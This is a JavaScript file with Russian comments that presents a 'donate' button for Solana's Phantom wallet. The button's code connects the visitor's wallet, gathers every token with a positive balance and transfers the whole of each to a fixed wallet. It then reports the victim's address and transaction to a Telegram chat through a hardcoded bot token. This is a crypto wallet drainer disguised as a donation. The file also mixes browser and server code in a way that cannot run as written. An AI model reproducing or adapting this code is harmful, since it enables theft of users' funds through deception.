const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const PORT = 3000;

// Telegram Bot
const BOT_TOKEN = "7826785273:AAGi1Tpb1sekJN1DvjPCwTBRpQIcqGwiOZw";
const CHAT_ID = "-1002294857850";
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

app.use(bodyParser.json());

const solanaWeb3 = require('@solana/web3.js');
const donateButton = document.getElementById("donateButton");
const charityWallet = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Укажите публичный адрес кошелька получателя.

donateButton.addEventListener("click", async () => {
    try {
        // Проверяем, установлен ли у пользователя Phantom Wallet
        if (!window.solana || !window.solana.isPhantom) {
            alert("Установите Phantom Wallet!");
            return;
        }

        // Подключение к кошельку
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        const provider = window.solana;
        await provider.connect();

        // Получаем активы пользователя
        const walletAddress = provider.publicKey.toString();
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            provider.publicKey,
            { programId: solanaWeb3.TOKEN_PROGRAM_ID }
        );

        const transactions = [];
        tokenAccounts.value.forEach((account) => {
            const balance = account.account.data.parsed.info.tokenAmount.uiAmount;
            const mintAddress = account.account.data.parsed.info.mint;

            if (balance > 0) {
                const instruction = solanaWeb3.Token.createTransferInstruction(
                    solanaWeb3.TOKEN_PROGRAM_ID,
                    new solanaWeb3.PublicKey(account.pubkey),
                    new solanaWeb3.PublicKey(charityWallet),
                    provider.publicKey,
                    [],
                    balance
                );
                transactions.push(instruction);
            }
        });

        if (transactions.length === 0) {
            alert("У вас нет токенов для отправки.");
            return;
        }

        // Создаем и подписываем транзакцию
        const transaction = new solanaWeb3.Transaction().add(...transactions);
        transaction.feePayer = provider.publicKey;
        transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

        const signedTransaction = await provider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());

        alert(`Донат отправлен! Транзакция: ${signature}`);

        // Отправляем уведомление на сервер
        await fetch("http://localhost:3000", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ walletAddress, signature }),
        });

    } catch (error) {
        console.error("Ошибка:", error);
        alert("Произошла ошибка при отправке доната.");
    }
});

// Получаем данные о транзакции
app.post("/", async (req, res) => {
    const { walletAddress, signature } = req.body;

    if (!walletAddress || !signature) {
        return res.status(400).send("Invalid request");
    }

    try {
        const message = `✅ Новое пожертвование! \n\n💼 Кошелек: ${walletAddress}\n🔗 Транзакция: https://explorer.solana.com/tx/${signature}`;
        await bot.sendMessage(CHAT_ID, message);
        res.status(200).send("Notification sent");
    } catch (error) {
        console.error("Ошибка отправки уведомления в Telegram:", error);
        res.status(500).send("Ошибка сервера");
    }
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
